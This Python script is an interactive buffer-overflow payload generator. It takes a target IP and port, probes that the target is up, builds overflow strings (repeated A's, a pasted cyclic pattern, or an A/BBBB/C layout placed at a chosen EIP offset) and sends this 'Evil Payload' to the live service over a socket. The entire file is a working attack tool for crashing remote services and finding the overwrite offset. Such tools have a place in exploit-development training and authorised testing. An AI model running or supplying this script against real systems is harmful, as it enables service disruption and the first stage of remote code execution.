#!/usr/bin/python3
# Author: Nobel Herrera (bl4cksmith)
# Twitter: @nobelh

import socket
# Functions
## Input validation
def inputval (tvar,tvalue):
    if tvar == "ip":
        if len(tvalue) > 15 or len(tvalue) < 7:
            print ("\r\n[*] Bad argument")
            quit()
        else: return 1
    
    elif tvar == "port":
        if len(tvalue) > 5 or len(tvalue) < 1:
            print ("\r\n[*] Bad argument")
            quit()
        else: return 1
    
    elif tvar == "paymode":
        paylist = ["1","2","3"]
        if tvalue not in paylist:
            print ("\r\n[*] Bad argument")
            quit()
        else: return 1
    
    elif tvar == "fpaysize":
        if len(tvalue) > 5 or len(tvalue) < 1:
            print ("\r\n[*] Bad argument")
            quit()
        else: return 1
    
    elif tvar == "inputpayload":
        if len(tvalue) > 9999 or len(tvalue) < 1:
            print ("\r\n[*] Bad argument")
            quit()
        else: return 1

    elif tvar == "paysize":
        if len(tvalue) > 9999 or len(tvalue) < 1:
            print ("\r\n[*] Bad argument")
            quit()
        else: return 1

    elif tvar == "offsetpos":
        if len(tvalue) > 9999 or len(tvalue) < 1:
            print ("\r\n[*] Bad argument")
            quit()
        else: return 1

    elif tvar == "cansend":
        if len(tvalue) > 1 or len(tvalue) < 1:
            print ("\r\n[*] Bad argument")
            quit()
        else: return 1

## Check target availiability function
def chktarget(targetip,tport):
    try:
        print ("[*] Trying Connection...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        conn = sock.connect((targetip,int(tport)))        
        sock.close ()
        print ("[*] Target is Up!\r\n")
        return 1    
    except:
          sock.close()
          print ("[*] Target not available :(\r\n")
          return 2

# Payload creator for ftp user bof
def paybuilder(targetip,tport,bufftype):
    if bufftype == "1":
        print ("\r\n[*] Build Payload")
        print ("--------------------------------")        
        fpaysize = input("[+] How many A's to send: ")
        print ("\r\n[*] Payload:")
        print ("--------------------------------")
        inputval("fpaysize",fpaysize)
        inputpayload = "A" * int(fpaysize)
        evilpay1 = (inputpayload)
        return evilpay1       
    # Single String to send patterns
    elif bufftype == "2":
        print ("\r\n[*] Build Payload")
        print ("--------------------------------")
        inputpayload = input("[+] Paste pattern string: ")
        print ("\r\n[*] Payload:")
        print ("--------------------------------")
        inputval("inputpayload",inputpayload)            
        evilpay1 = (inputpayload)
        return evilpay1
    # ABC Pattern
    elif bufftype == "3":
        print ("\r\n[*] Build Payload")
        print ("--------------------------------")        
        paysize = input("[+] Enter the payload size: ")
        offsetpos = input("[+] Enter the EIP offset position: ")
        print ("\r\n[*] Payload:")
        print ("--------------------------------")
        # Payload Builder
        asbuffer = "A" * int(offsetpos)
        bsbuffer = "BBBB"
        csbuffer = "C" * (int(paysize)-(int(offsetpos)+(4)))
        inputval("paysize",paysize)
        inputval("offsetpos",offsetpos)
        evilpay1 = (asbuffer + bsbuffer + csbuffer)
        return evilpay1
    else:
        quit()  

# Script Interactive section
print ("\r\n================================")
print ("BoF Basic Payload Generator")
print ("================================")

# Process target information 
target = input("[+] Enter target IP: ")
port = input ("[+] Enter target port: ")
## Validate input
inputval("ip",target)
inputval ("port",port)
print ("[*] You've entered IP:"+target+" Port:"+port)
## Call chktarget to check if target is alive
print ("\r\n[*] Checking if the target is alive")
print ("--------------------------------")
isitalive = (chktarget(target,port))

# Process Payload Type:
print ("[*] Select Payload Mode")
print ("--------------------------------")
print ("(1) Multiple A letters payload")
print ("(2) Cyclical pattern")
print ("(3) ABC payload")
print ("------")
paymode = input("[+] Enter payload mode: ")
## Validate input
inputval("paymode",paymode)
print ("[*] You've selected service type: "+paymode)
evilpayload = ((paybuilder(target,port,paymode))+"\r\n")
print (evilpayload)
print ("--------------------------------")

# Sending Payload
print ("\r\n[*] Prepare to send the payload")
cansend = input("[+] Enter 1 to send the payload or 2 to cancel: ")
inputval("cansend",cansend)
if cansend == "1":
    try:
        #Open Connection
        print ("\r\n[*] Opening Connection...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        conn = sock.connect((target,int(port)))
        banner = sock.recv(1024)
        print ("[*] Printing banner:")
        print (banner)
        # Sending payload
        print ("\r\n[*] Sending Evil Payload...")
        
        sock.send (evilpayload.encode())
        banner = sock.recv(1024)
        print ("[*] Printing Target Response:")
        print (banner)
        sock.close()
    except:
          sock.close()
          print ("[*] Target not available :(\r\n")
else:
    quit()



